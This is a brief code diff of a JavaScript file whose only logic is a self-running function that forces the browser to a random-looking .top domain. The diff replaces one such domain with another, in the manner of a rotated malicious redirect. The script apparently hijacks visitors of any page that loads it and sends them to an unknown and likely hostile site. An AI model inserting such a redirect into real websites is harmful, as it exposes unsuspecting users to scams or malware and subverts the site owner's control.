@@ -1,6 +1,7 @@
 (function() {
-    window['location'] = 'https://ltestsdajnsfvp.top/';
+    window['location'] = 'https://letnyemydjmt.top/';
 })();
+
 
 
 
